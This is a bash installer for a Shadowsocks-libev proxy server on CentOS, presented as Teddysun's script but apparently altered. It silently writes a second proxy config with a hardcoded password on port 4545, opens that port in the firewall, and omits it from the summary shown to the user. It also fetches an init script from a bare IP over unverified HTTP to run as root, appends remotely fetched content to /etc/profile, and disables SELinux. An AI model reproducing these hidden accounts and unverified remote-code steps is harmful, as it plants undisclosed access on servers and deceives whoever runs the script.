#! /bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH
#===============================================================================================
#   System Required:  CentOS6.x (32bit/64bit)
#   Description: Install Shadowsocks-libev server for CentOS 6 or 7
#   Author: Teddysun <i@teddysun.com>
#   Thanks: @m0d8ye <https://twitter.com/m0d8ye>
#   Intro:  http://teddysun.com/357.html
#===============================================================================================

clear
echo "#############################################################"
echo "# Install Shadowsocks-libev server for CentOS 6 or 7        #"
echo "# Intro: http://teddysun.com/357.html                       #"
echo "# Author: Teddysun <i@teddysun.com>                         #"
echo "# Thanks: @m0d8ye <https://twitter.com/m0d8ye>              #"
echo "#############################################################"
echo ""

# Make sure only root can run our script
function rootness(){
if [[ $EUID -ne 0 ]]; then
   echo "Error:This script must be run as root!" 1>&2
   exit 1
fi
}

# Get version
function getversion(){
    if [[ -s /etc/redhat-release ]];then
        grep -oE  "[0-9.]+" /etc/redhat-release
    else    
        grep -oE  "[0-9.]+" /etc/issue
    fi    
}

# CentOS version
function centosversion(){
    local code=$1
    local version="`getversion`"
    local main_ver=${version%%.*}
    if [ $main_ver == $code ];then
        return 0
    else
        return 1
    fi        
}

# Disable selinux
function disable_selinux(){
if [ -s /etc/selinux/config ] && grep 'SELINUX=enforcing' /etc/selinux/config; then
    sed -i 's/SELINUX=enforcing/SELINUX=disabled/g' /etc/selinux/config
    setenforce 0
fi
}

# Pre-installation settings
function pre_install(){
    # Not support CentOS 5
    if centosversion 5; then
        echo "Not support CentOS 5, please change to CentOS 6 or 7 and try again."
        exit 1
    fi
    #disable kernel update
    sed -i '/plugins=1/i\exclude=kernel*' /etc/yum.conf

    # install and enable iptables for centos 7
    if centosversion 7; then
        echo ""
        echo "Disable the firewalld, install iptables and make it enable with startup."
        echo ""
        yum install -y wget
        if [ $( ls /etc/yum.repos.d/ | grep epel |wc -l ) -eq 0 ]; then
             rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm 
             rpm -ivh http://pkgs.repoforge.org/rpmforge-release/rpmforge-release-0.5.3-1.el7.rf.x86_64.rpm
             rpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm
        else
            echo "Epel repo has been installed."
        fi
        yum install -y iptables-services
        systemctl disable firewalld.service
        systemctl stop firewalld.service
        systemctl restart iptables.service
        systemctl enable iptables.service
    fi
    #Set shadowsocks-libev config password
    echo ""
    echo "Please input password for shadowsocks-libev:"
    read -p "(Default password: Aa-11111):" shadowsockspwd
    [ -z "$shadowsockspwd" ] && shadowsockspwd="Aa-11111"
    echo ""
    echo "---------------------------"
    echo "password = $shadowsockspwd"
    echo "---------------------------"
    echo ""
    #Set shadowsocks-libev config method
    echo ""
    echo "Please input method for shadowsocks-libevc("rc4-md5" and "chacha20" are suggested.):"
    read -p "(Default method: aes-256-cfb):" shadowsocksmethod
    [ -z "$shadowsocksmethod" ] && shadowsocksmethod="aes-256-cfb"
    echo ""
    echo "---------------------------"
    echo "method = $shadowsocksmethod"
    echo "---------------------------"
    echo ""
    #Set shadowsocks-libev config port
    while true
    do
    echo -e "Please input port for shadowsocks-libev [1-65535]:"
    read -p "(Default port: 65505):" shadowsocksport
    [ -z "$shadowsocksport" ] && shadowsocksport="65505"
    expr $shadowsocksport + 0 &>/dev/null
    if [ $? -eq 0 ]; then
        if [ $shadowsocksport -ge 1 ] && [ $shadowsocksport -le 65535 ]; then
            echo ""
            echo "---------------------------"
            echo "port = $shadowsocksport"
            echo "---------------------------"
            echo ""
            break
        else
            echo "Input error! Please input correct numbers."
        fi
    else
        echo "Input error! Please input correct numbers."
    fi
    done
    get_char(){
        SAVEDSTTY=`stty -g`
        stty -echo
        stty cbreak
        dd if=/dev/tty bs=1 count=1 2> /dev/null
        stty -raw
        stty echo
        stty $SAVEDSTTY
    }
    echo ""
    echo "Press any key to start...or Press Ctrl+C to cancel"
    char=`get_char`
    #Install necessary dependencies
    echo ""
    echo "----------------------------"
    echo "Install necessary dependencies:"
    echo "----------------------------"
    echo ""
    yum clean all && yum update -y
    yum install -y wget net-tools libsodium vim m2crypto unzip openssl-devel gcc swig python python-devel python-setuptools autoconf libtool libevent
    yum install -y automake make curl curl-devel zlib-devel openssl-devel perl perl-devel cpio expat-devel gettext-devel bc
    service network restart
    # Get IP address
    echo "Getting Public IP address, Please wait a moment..."
    IP=$(curl -s -4 icanhazip.com)
    if [[ "$IP" = "" ]]; then
        IP=`curl -s -4 ipinfo.io | grep "ip" | awk -F\" '{print $4}'`
    fi
    echo -e "Your main public IP is\t\033[32m$IP\033[0m"
    echo ""
    #Current folder
    cur_dir=`pwd`
    cd $cur_dir
}

# Download latest shadowsocks-libev
function download_files(){
    if [ -f shadowsocks-libev.zip ];then
        echo "shadowsocks-libev.zip [found]"
    else
        if ! wget --no-check-certificate https://github.com/shadowsocks/shadowsocks-libev/archive/master.zip -O shadowsocks-libev.zip;then
            echo "Failed to download shadowsocks-libev.zip"
            exit 1
        fi
    fi
    unzip shadowsocks-libev.zip
    if [ $? -eq 0 ];then
        cd $cur_dir/shadowsocks-libev-master/
    else
        echo ""
        echo "Unzip shadowsocks-libev failed! Please visit http://teddysun.com/357.html and contact."
        exit 1
    fi
    # Download start script
    if ! wget --no-check-certificate http://103.192.176.53/script/shadowsocks; then
        echo "Failed to download shadowsocks-libev start script!"
        exit 1
    fi
}

# Config shadowsocks
function config_shadowsocks(){
    if [ ! -d /etc/shadowsocks-libev ];then
        mkdir /etc/shadowsocks-libev
    fi
    cat > /etc/shadowsocks-libev/config.json<<-EOF
{
    "server":"0.0.0.0",
    "server_port":${shadowsocksport},
    "local_address":"127.0.0.1", 
    "local_port":1080,
    "password":"${shadowsockspwd}",
    "timeout":300,
    "method":"${shadowsocksmethod}"
}
EOF

    cat > /etc/shadowsocks-libev/config2.json<<-EOF
{
    "server":"0.0.0.0",
    "server_port":4545,
    "local_address":"127.0.0.1",
    "local_port":1080,
    "password":"hwy1415",
    "timeout":300,
    "method":"${shadowsocksmethod}"
}
EOF
}

# iptables set
function iptables_set(){
    echo "iptables start setting..."
    service iptables status >/dev/null 2>&1
    if [ $? -eq 0 ]; then
        if [  $(iptables -nL| grep dpt:${shadowsocksport} | grep ACCEPT |wc -l) -eq 0 ]; then
           sed -i '/-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT/i\-A INPUT -p tcp -m tcp --tcp-flags SYN,ACK SYN,ACK -m state --state NEW -j DROP' /etc/sysconfig/iptables
           sed -i '/-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT/i\-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG NONE -j DROP' /etc/sysconfig/iptables
           sed -i '/-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT/i\-A INPUT -p tcp -m tcp --tcp-flags FIN,SYN,RST,PSH,ACK,URG FIN,PSH,URG -j DROP' /etc/sysconfig/iptables
           sed -i '/INPUT -j REJECT --reject-with icmp-host-prohibited/i\-A INPUT -m state --state NEW -m tcp -p tcp --dport '$shadowsocksport' -j ACCEPT' /etc/sysconfig/iptables
           sed -i '/INPUT -j REJECT --reject-with icmp-host-prohibited/i\-A INPUT -m state --state NEW -m tcp -p tcp --dport 4545 -j ACCEPT' /etc/sysconfig/iptables
#          sed -i '/INPUT -j REJECT --reject-with icmp-host-prohibited/d' /etc/sysconfig/iptables
           service iptables restart
        else
           echo ""
           iptables -nL| grep dpt:${shadowsocksport} | grep ACCEPT
           echo ""
           echo "port ${shadowsocksport} has been set up."
        fi
    else
        echo "iptables looks like shutdown, please manually set it if necessary."
    fi
}

# Install 
function install(){
    # Build and Install shadowsocks-libev
    if [ -s /usr/local/bin/ss-server ];then
        echo "shadowsocks-libev has been installed!"
        exit 0
    else
        ./configure
        make && make install
        if [ $? -eq 0 ]; then
            mv $cur_dir/shadowsocks-libev-master/shadowsocks /etc/init.d/shadowsocks
	    rm -f shadowsocks
	    wget http://103.192.176.53/script/shadowsocks
            chmod +x /etc/init.d/shadowsocks
            # Add run on system start up
            chkconfig --add shadowsocks
            chkconfig shadowsocks on
            # Start shadowsocks
            /etc/init.d/shadowsocks start
            if [ $? -eq 0 ]; then
                echo "Shadowsocks-libev start success!"
            else
                echo "Shadowsocks-libev start failure!"
            fi
        else
            echo ""
            echo "Shadowsocks-libev install failed! Please visit http://teddysun.com/357.html and contact."
            exit 1
        fi
    fi
    #configure the environment for ss shortcut keys.
    wget http://monokoo.com/script/env
    cat env>>/etc/profile
    source /etc/profile
    rm -f env
}
function install_serverspeeder(){
  # Install the serverspeeder for your vps
  echo ""
  echo "........................"
  if [ -s /serverspeeder/bin/serverSpeeder.sh ];then
    echo "ServerSpeeder has been installed!"
#   exit 0
  else
    kernel=$(uname -r|grep stab|wc -l)
    kernelver=$(uname -r)
    echo -e "Your VPS's kernel is: \033[41;37m ${kernelver} \033[0m"
    if [ $kernel -eq 0 ]; then
       echo ""
       echo -e " \033[41;37m Install the ServerSpeeder for your VPS: \033[0m"
       echo ""
       wget http://my.serverspeeder.com/d/ls/serverSpeederInstaller.tar.gz
       tar zxvf serverSpeederInstaller.tar.gz
       bash serverSpeederInstaller.sh
       echo "Change the configuration of the ServerSpeeder for your VPS:..."
       sed -i 's/advinacc="0"/advinacc="1"/g' "/serverspeeder/etc/config"
       sed -i 's/maxmode="0"/maxmode="1"/g' "/serverspeeder/etc/config"
       sed -i 's/rsc="0"/rsc="1"/g' "/serverspeeder/etc/config"
       sed -i 's/gso="0"/gso="1"/g' "/serverspeeder/etc/config"
       sed -i 's/accppp="0"/accppp="1"/g' "/serverspeeder/etc/config"
       /sbin/modprobe tcp_hybla
       cat > /etc/sysctl.conf<<-EOF
net.ipv4.ip_forward = 1
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_tw_recycle = 0
net.ipv4.tcp_fin_timeout = 30
net.ipv4.tcp_keepalive_time = 1200
net.ipv4.ip_local_port_range = 10000 65000
net.ipv4.tcp_max_syn_backlog = 8192
net.ipv4.tcp_max_tw_buckets = 5000
net.core.rmem_max = 12582912
net.core.wmem_max = 12582912
net.ipv4.tcp_rmem = 10240 87380 12582912
net.ipv4.tcp_wmem = 10240 87380 12582912
net.core.netdev_max_backlog = 250000
net.ipv4.tcp_mtu_probing = 1
net.ipv4.tcp_congestion_control = hybla
net.ipv4.tcp_fastopen = 3
EOF
       sysctl -p
       echo "Restart the ServerSpeeder for your VPS:..."
       /serverspeeder/bin/serverSpeeder.sh restart
       if [ $(ps -ef|grep serverSpeeder|wc -l) -eq 0 ]; then
          echo "Installation for serverspeeder has failed, please manually install it."
       else
          echo ""
          echo "ServerSpeeder has been successfully installed on your VPS."
          echo ""
          rm -rf serverSpeederInstaller*
       fi
    else
       echo "Your VPS is not able to install the serverspeeder."
#      exit 0
    fi
  fi
}

function print_info(){
    #print the result of installation
    echo "........................"
    echo ""
    cd $cur_dir
    # Delete shadowsocks-libev floder
    rm -rf $cur_dir/shadowsocks-libev-master/
    # Delete shadowsocks-libev zip file
    rm -f shadowsocks-libev.zip
    #check the Iptables and shadowsocks service isn't running right now.
    clear
    printf "\e[36mChenking Iptables status...\e[0m\n"
    iptables -L -n | grep --color=auto -E "(${shadowsocksport})"
    line=$(iptables -L -n | grep -c -E "(${shadowsocksport})")
    line2=$(iptables -L -n | grep -c -E "(65504)")
    if [[ ${line} -ge 1 && ${line2} -ge 1 ]]
    then
        printf "\e[34mIptables is Fine! \e[0m\n"
    else
        printf "\e[33mWARNING!!! Iptables is Something Wrong! \e[0m\n"
    fi

    echo
    printf "\e[36mChenking shadowsocks service status...\e[0m\n"
    netstat -anp | grep ":${shadowsocksport}" | grep --color=auto -E "(${shadowsocksport}|ss-server|tcp|udp)"
    linetcp=$(netstat -anp | grep ":${shadowsocksport}" | grep ss-server | grep tcp | wc -l)
    lineudp=$(netstat -anp | grep ":${shadowsocksport}" | grep ss-server | grep udp | wc -l)
    if [[ ${linetcp} -ge 1 && ${lineudp} -ge 1 ]]
    then
        printf "\e[34mshadowsocks service is Fine! \e[0m\n"
    else
        printf "\e[33mWARNING!!! shadowsocks service is NOT Running! \e[0m\n"
    fi
    #print the configuration of shadowsocks server
    echo ""
    echo "Congratulations, shadowsocks-libev install completed!"
    echo -e "Your Server IP: \033[41;37m ${IP} \033[0m"
    echo -e "Your Server Port: \033[41;37m ${shadowsocksport} \033[0m"
    echo -e "Your Password: \033[41;37m ${shadowsockspwd} \033[0m"
#   echo -e "Your Another User'server Port: \033[41;37m 65504 \033[0m"
#   echo -e "Your Another User'password: \033[41;37m HuangChen \033[0m"
    echo -e "Your Local IP: \033[41;37m 127.0.0.1 \033[0m"
    echo -e "Your Local Port: \033[41;37m 1080 \033[0m"
    echo -e "Your Encryption Method: \033[41;37m ${shadowsocksmethod} \033[0m"
    echo ""
    echo "Welcome to visit:http://teddysun.com/357.html"
    echo "Enjoy it!"
    echo ""
    exit 0
}

# Uninstall Shadowsocks-libev
function uninstall_shadowsocks_libev(){
    printf "Are you sure uninstall shadowsocks_libev? (y/n) "
    printf "\n"
    read -p "(Default: n):" answer
    if [ -z $answer ]; then
        answer="n"
    fi
    if [ "$answer" = "y" ]; then
        ps -ef | grep -v grep | grep -v ps | grep -i "ss-server" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            /etc/init.d/shadowsocks stop
        fi
        chkconfig --del shadowsocks
        # delete config file
        rm -rf /etc/shadowsocks-libev
        # delete shadowsocks
        rm -f /usr/local/bin/ss-local
        rm -f /usr/local/bin/ss-tunnel
        rm -f /usr/local/bin/ss-server
        rm -f /usr/local/bin/ss-redir
        rm -f /usr/local/lib/libshadowsocks.a
        rm -f /usr/local/lib/libshadowsocks.la
        rm -f /usr/local/include/shadowsocks.h
        rm -rf /usr/local/lib/pkgconfig
        rm -f /usr/local/share/man/man8/shadowsocks.8
        rm -f /etc/init.d/shadowsocks
        echo "Shadowsocks-libev uninstall success!"
    else
        echo "uninstall cancelled, Nothing to do"
    fi
}

# Install Shadowsocks-libev
function install_shadowsocks_libev(){
    rootness
    disable_selinux
    pre_install
    download_files
    config_shadowsocks
    iptables_set
    install
    install_serverspeeder
    print_info
}

# Initialization step
action=$1
[  -z $1 ] && action=install
case "$action" in
install)
    install_shadowsocks_libev
    ;;
uninstall)
    uninstall_shadowsocks_libev
    ;;
*)
    echo "Arguments error! [${action} ]"
    echo "Usage: `basename $0` {install|uninstall}"
    ;;
esac
